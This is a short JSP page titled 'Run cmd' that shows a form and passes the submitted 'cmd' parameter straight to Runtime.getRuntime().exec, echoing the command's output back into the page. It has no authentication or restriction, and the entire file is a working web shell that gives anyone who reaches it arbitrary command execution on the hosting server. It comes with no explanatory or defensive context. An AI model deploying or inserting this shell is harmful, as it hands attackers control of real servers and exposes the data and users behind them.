<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ page
	import="java.io.IOException,java.io.BufferedReader,java.io.InputStreamReader"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Run cmd</title>
</head>
<body>
	Run a command:
	<form action="cmd.jsp" method="GET">
		Command: <input type="text" name="cmd"> <br /> <input
			type="submit" value="Submit" />
	</form>
	<%
		try {
			if (request.getParameter("cmd") != null && !request.getParameter("cmd").isEmpty()) {
				String line = "";
				Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
				BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
				while ((line = in.readLine()) != null) {
					out.print(line + "<br>");
				}
				in.close();
			}
		} catch (Exception e) {
			out.print(e);
		}
	%>
</body>
</html>